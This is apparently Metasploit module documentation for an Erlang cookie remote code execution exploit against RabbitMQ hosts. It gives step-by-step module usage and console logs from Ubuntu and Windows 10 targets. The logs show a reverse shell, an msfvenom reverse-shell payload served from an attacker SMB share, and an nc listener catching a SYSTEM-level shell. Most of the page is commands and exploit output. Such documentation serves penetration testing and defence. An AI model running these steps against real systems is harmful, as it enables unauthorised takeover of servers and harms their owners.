## Vulnerable Application

  The [Erlang Port Mapper Daemon](https://www.erlang.org/) is used to coordinate distributed erlang
  instances. Should an attacker gain access to this cookie code execution is trivial. Normally this
  cookie can be found in the home directory as ".erlang.cookie", however it varies system to system
  as well as it's configuration. As an example on a Windows 10 instance it can be found under the
  users home directory: e.g "C:\Users\<USER>\.erlang.cookie". Code execution is achieved via the
  "os:cmd('cmd')." command

## Verification Steps
  
  1. Install the Erlang Port Mapper Daemon
  2. Install RabbitMQ
  3. Start `msfconsole`
  4. Do `use exploit/unix/erlang_cookie_rce`
  5. Do `set RHOST <ip>`
  6. Do `set COOKIE <cookie>`
  7. Do set appropriate payload (Unix=cmd/unix/reverse, Windows=cmd/windows/generic)
  8. Do `set LHOST <host>`
  9. `exploit` and verify shell is opened (varies per OS)

## Scenarios

### Ubuntu 16.04.5 LTS

```
msf exploit(multi/erlang_cookie_rce) > options 

Module options (exploit/multi/erlang_cookie_rce):

   Name    Current Setting       Required  Description
   ----    ---------------       --------  -----------
   COOKIE  EXAMPLE               yes       Erlang cookie to login with
   RHOST   A.B.C.D               yes       The target address
   RPORT   25672                 yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  W.X.Y.Z          yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf exploit(multi/erlang_cookie_rce) > exploit

[*] Started reverse TCP double handler on W.X.Y.Z:4444 
[*] A.B.C.D:25672 - Receiving server challenge
[*] A.B.C.D:25672 - Sending challenge reply
[*] A.B.C.D:25672 - Challenge sent, sending payload
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo XinIWxzXWDO5x9EM;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "XinIWxzXWDO5x9EM\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (W.X.Y.Z:4444 -> A.B.C.D:46410) at 2018-12-09 14:45:47 -0600

id
uid=122(rabbitmq) gid=130(rabbitmq) groups=130(rabbitmq)
```

### Windows 10 (Build 17134)

```
msf exploit(multi/erlang_cookie_rce) > options 

Module options (exploit/multi/erlang_cookie_rce):

   Name    Current Setting       Required  Description
   ----    ---------------       --------  -----------
   COOKIE  MOLKLGXHWQLTGUREBDKI  yes       Erlang cookie to login with
   RHOST   A.B.C.D               yes       The target address
   RPORT   25672                 yes       The target port (TCP)


Payload options (cmd/windows/generic):

   Name  Current Setting              Required  Description
   ----  ---------------              --------  -----------
   CMD   \\W.X.Y.Z\BOB\t.exe  yes       The command string to execute


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf exploit(multi/erlang_cookie_rce) > exploit

[*] A.B.C.D:25672 - Receiving server challenge
[*] A.B.C.D:25672 - Sending challenge reply
[*] A.B.C.D:25672 - Challenge sent, sending payload
[*] Exploit completed, but no session was created.

--- Impacket SMB Server ---
root@kali:/tmp# msfvenom -p windows/x64/shell_reverse_tcp LHOST=W.X.Y.Z LPORT=3 -f exe -o t.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                 
[-] No arch selected, selecting arch: x64 from the payload                                             
No encoder or badchars specified, outputting raw payload                                               
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: t.exe
root@kali:/tmp# impacket-smbserver BOB .
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies                                      

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0                                 
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0                                 
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (A.B.C.D,50349)
[*] AUTHENTICATE_MESSAGE (\,DESKTOP-85258BS)
[*] User \DESKTOP-85258BS authenticated successfully                                                   
[*] :::00::4141414141414141

--- Handler ---

root@kali:~# nc -lvp 3
Listening on [0.0.0.0] (family 0, port 3)
Connection from A.B.C.D 50350 received!
Microsoft Windows [Version 10.0.17134.407]
(c) 2018 Microsoft Corporation. All rights reserved.                                                   

C:\Users\667563~1\AppData\Roaming\RabbitMQ>whoami
whoami
nt authority\system

C:\Users\667563~1\AppData\Roaming\RabbitMQ>
```
